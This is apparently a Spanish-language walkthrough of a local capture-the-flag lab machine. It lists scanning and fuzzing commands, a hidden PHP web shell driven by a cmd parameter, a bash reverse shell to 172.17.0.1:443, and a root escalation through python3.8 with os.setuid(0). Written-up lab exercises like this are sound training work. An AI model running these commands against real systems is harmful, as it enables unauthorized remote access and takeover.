nmap: 22,80

![image](https://github.com/user-attachments/assets/fa1ec9f2-3652-4885-b2da-5f55617289e1)

entramos a la pagina y tenemos esto

![image](https://github.com/user-attachments/assets/c08b40e7-b159-485b-8b84-a1efb6d64a9d)

y en el código fuente esto:

![image](https://github.com/user-attachments/assets/fa52b375-21db-4e37-ba73-7f084d8819ad)

ahí muestra una "shell.php" y un "acces panel", hacemos un gobuster 

      gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,py,txt

vamos consiguiendo diferentes resultados

un backup.txt

![image](https://github.com/user-attachments/assets/cc37c0ec-1178-459b-9fb0-b2beaa6972cf)

un hidden

![image](https://github.com/user-attachments/assets/8c6d7b64-cdc8-41c0-811e-0958c74cf18f)

probamos el hidden con el shell.php que nos mostro el código fuente

![image](https://github.com/user-attachments/assets/5dd5347d-f21e-4cd5-8272-344c9ecb92a5)

pero no nos muestra nada, pero como es una shell.php vamos a probar si directorios extras comunes como un "?file" o "?cmd", de no ser así lanzamos este comando

     wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://172.17.0.2/hidden/.shell.php?FUZZ=id"

pero funciona con el "cmd"

![image](https://github.com/user-attachments/assets/50acadca-4f51-4466-b7f4-c1c2d14e4961)

así que podemos lanzar una bash y dejar el terminal en escucha

    bash -c 'bash -i>& /dev/tcp/172.17.0.1/443 0>&1'

tenemos esta pero no funciona así que la podemos URL encodear https://www.urlencoder.org/

y obtenemos la conexión

![image](https://github.com/user-attachments/assets/c74fd070-2629-4a38-ad66-f5671360fa6a)

ahora escalamos a root, encontramos esto

![image](https://github.com/user-attachments/assets/26c80f9d-01b1-48f3-8a1e-2c60e26806b9)

igual encontramos esto

![image](https://github.com/user-attachments/assets/7ac94d96-6ad7-42ed-97b3-5478c932b5e4)

python 3.8, así que podemos lanzar este comando para ser root

     python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

![image](https://github.com/user-attachments/assets/7e3c623f-03dd-4e78-9230-e11cfeb2c7e5)

y somos root! 
